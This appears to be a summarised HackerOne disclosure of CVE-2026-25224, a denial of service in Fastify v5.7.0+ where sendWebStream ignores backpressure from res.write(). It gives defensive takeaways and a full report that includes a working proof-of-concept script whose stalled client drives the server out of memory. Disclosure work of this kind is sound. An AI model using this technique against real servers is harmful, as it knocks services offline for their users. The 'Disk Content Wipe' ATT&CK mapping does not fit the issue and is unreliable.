# DoS via Unbounded Memory Allocation in sendWebStream on Fastify v5.7.0+ (Backpressure Ignored)

## Metadata
- **Source:** HackerOne
- **Report:** 3524779 | https://hackerone.com/reports/3524779
- **Submitted:** 2026-01-26
- **Reporter:** onlybugs05
- **Program:** Fastify
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** CWE-770: Allocation of Resources Without Limits or Throttling, Denial of Service (DoS), Improper Resource Management, Unhandled Backpressure
- **CVEs:** CVE-2026-25224
- **Category:** uncategorised

## Summary
Fastify v5.7.0+ contains a DoS vulnerability in the sendWebStream function where TCP backpressure signals from res.write() are ignored, causing unbounded memory allocation. An attacker can exploit this by initiating a request to a Web Stream endpoint and not reading the response, forcing the server to buffer the entire stream in memory until OOM crash occurs.

## Attack scenario
1. Attacker identifies a Fastify v5.7.0+ endpoint that returns a ReadableStream (Web Streams API)
2. Attacker initiates an HTTP GET request to the vulnerable endpoint but does not read the response body
3. This causes TCP's receive window to close, signaling backpressure to the server
4. The vulnerable sendWebStream implementation ignores the res.write() return value and continues pulling data from the stream
5. Server memory rapidly fills with buffered data as the stream producer continues enqueuing chunks
6. Server process exhausts available heap memory and crashes with Out-Of-Memory error

## Root cause
The sendWebStream function in lib/reply.js fails to respect TCP backpressure signals. When res.write() returns false (indicating the internal buffer is full), Fastify schedules the next stream read immediately regardless, causing unbounded memory accumulation. The code ignores the boolean return value that should trigger pause/resume flow control.

## Attacker mindset
An attacker seeks to crash the application with minimal effort by exploiting improper stream handling. The attack requires only network access and knowledge that the server uses Web Streams—no authentication or complex exploitation needed. The attacker can launch this as a cheap amplification attack against multiple endpoints simultaneously.

## Defensive takeaways
- Always respect backpressure signals: check res.write() return value and pause stream reading when it returns false
- Implement proper flow control using reader.read().then() only after confirming write buffer capacity
- Use Node.js pipeline() or pump() utilities which handle backpressure automatically
- Add memory usage monitoring and alerts to detect abnormal buffering patterns
- Implement request timeouts and connection limits to mitigate resource exhaustion
- Add unit tests explicitly validating backpressure handling for stream responses
- Consider rate limiting or request queue management for stream-based endpoints
- Validate and test with slow/non-responsive clients in test suites

## Variant hunting
Check other streaming implementations (sendFile, piping) for similar backpressure handling
Review all code paths using res.write() for ignored return values
Search for stream.pipe() usage without error/drain handlers
Audit any custom stream transformation logic for backpressure awareness
Examine pagination endpoints that might stream large result sets
Look for streaming download/export features vulnerable to the same pattern
Test all Web Streams API integrations with slow consumers
Review any async iteration patterns that don't await buffer state

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1499: Endpoint Denial of Service
- T1499.004: Application Exhaustion Flood
- T1561.002: Disk Content Wipe (indirect via resource exhaustion)

## Notes
This vulnerability affects Fastify v5.7.0 and later versions that introduced native Web Streams support. The fix requires modifying the sendWebStream function to check res.write() return value and conditionally schedule the next read using the 'drain' event when backpressure occurs. The PoC clearly demonstrates the issue with a simple 1MB chunk repeated until OOM. This is a regression in newer versions rather than a long-standing issue.

## Full report
<details><summary>Expand</summary>

# Denial of Service (DoS) via Unbounded Memory Allocation in `sendWebStream` (Backpressure Ignored)

## Weakness
**CWE-770**: Allocation of Resources Without Limits or Throttling

## Severity
**High (7.5)**
*   **Vector String**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
*   **Attack Vector**: Network
*   **Attack Complexity**: Low
*   **Privileges Required**: None
*   **User Interaction**: None
*   **Availability**: High

## Summary

I have discovered a High-Severity Denial of Service (DoS) vulnerability in Fastify **v5.7.0 and later**. The issue lies in the `sendWebStream` function within `lib/reply.js`, which was recently introduced to support native Web Streams.

The implementation fails to handle TCP backpressure correctly. When a `ReadableStream` is sent as a response, Fastify continuously pulls data from the stream producer (`controller.enqueue`) and writes it to the response object (`res.write`). However, it **ignores the return value of `res.write()`**.

In a healthy system, `res.write()` returns `false` when the internal buffer is full, signaling that the producer should pause (backpressure). Because Fastify ignores this signal and immediately schedules the next read, a fast producer (e.g., a file stream or generated data) connected to a slow or stalled client will fill the server's memory indefinitely.

An attacker can exploit this by initiating a request to an endpoint that returns a Web Stream and simply **not reading the response**. This forces the server to buffer the entire stream in memory, leading to an Out-Of-Memory (OOM) crash.

## Steps To Reproduce

To reproduce this vulnerability, you need a Fastify server version 5.7.0 or higher.

1. Create a new folder and install `fastify`:

```bash
mkdir fastify-oom-poc
cd fastify-oom-poc
npm init -y
npm install fastify@latest
```

2. Create a file named `reproduce_oom.js` with the following content:

```javascript
'use strict'

const Fastify = require('fastify')
const { ReadableStream } = require('node:stream/web')
const { connect } = require('node:net')

// Initialize Fastify
const fastify = Fastify({ logger: false })

// Define a route that returns an infinite stream using Web Streams
fastify.get('/stream', (req, reply) => {
  const stream = new ReadableStream({
    pull(controller) {
      // Push a 1MB chunk. 
      // In a secure implementation, this should pause when the buffer is full.
      // In Fastify v5.7.0+, this keeps getting called indefinitely.
      controller.enqueue(Buffer.alloc(1024 * 1024, 'a'))
      
      // Log memory usage to demonstrate the leak
      if (Math.random() < 0.05) {
        const usage = process.memoryUsage().rss / 1024 / 1024
        console.log(`[Server] Memory usage: ${usage.toFixed(2)} MB`)
      }
    }
  })
  
  return reply.send(stream)
})

async function run() {
  try {
    const address = await fastify.listen({ port: 0 })
    const port = fastify.server.address().port
    console.log(`Server listening on port ${port}`)

    console.log('Connecting malicious client...')
    // Create a client that connects but stops reading after the initial request
    const client = connect(port, 'localhost', () => {
      // Send a minimal HTTP request headers
      client.write('GET /stream HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n')
    })
    
    // CRITICAL: We intentionally DO NOT add a 'data' listener to the client.
    // This causes the TCP window to close, signaling backpressure.
    // Fastify ignores this signal and keeps buffering data in RAM.

    client.on('error', (err) => console.error('Client error:', err))
    
    console.log('Client connected and paused. Watching server memory usage...')
    
  } catch (err) {
    console.error('Error starting server:', err)
    process.exit(1)
  }
}

run()
```

3. Run the reproduction script:

```bash
node reproduce_oom.js
```

**Observed Result:**
You will see the memory usage print to the console. It will rise rapidly until the process crashes.

```text
Server listening on port 36451
Connecting malicious client...
Client connected and paused. Watching server memory usage...
[Server] Memory usage: 105.42 MB
[Server] Memory usage: 520.18 MB
[Server] Memory usage: 1540.66 MB
[Server] Memory usage: 2890.12 MB
<--- Last few GCs --->
[1234:0x5678]    15000 ms: Mark-sweep 4000.5 (4100.0) -> 4000.2 (4100.0) MB, 0.1 / 0.0 ms  (average mu = 0.123, current mu = 0.012) allocation failure; scavenge might not succeed
FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
```

## Supporting Material/References

The vulnerability is in `lib/reply.js` in the `sendWebStream` function.

```javascript
// Vulnerable implementation in Fastify v5.7.x
function onRead (result) {
  if (result.done) {
    // ...
    return
  }
  // VULNERABILITY: Return value of res.write is ignored!
  res.write(result.value) 
  
  // The next read happens immediately, regardless of buffer state
  reader.read().then(onRead, onReadError) 
}
```

## Impact
**Denial of Service (DoS)**: A single attacker with a standard network connection can crash the Fastify server by targeting any endpoint that returns a Web Stream. This shuts down the service for all legitimate users and may incur restart costs or downtime. No authentication or special privileges are required.

</details>

---
*Analysed by Claude on 2026-05-24*
